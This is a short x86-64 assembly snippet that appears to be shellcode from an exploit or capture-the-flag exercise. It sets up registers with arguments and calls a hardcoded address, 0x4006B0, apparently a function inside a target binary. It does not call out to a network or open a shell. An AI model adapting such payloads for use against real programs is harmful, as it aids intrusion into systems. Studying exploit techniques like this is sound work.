BITS 64
global _start

_start:
	mov edi, 0xcafebabe
	push 0x7f
	pop rsi
	mov edx, esi
	inc si
	xor ecx, ecx
	lea r8, [rcx-1]
	mov rax, 0x4006B0
	call rax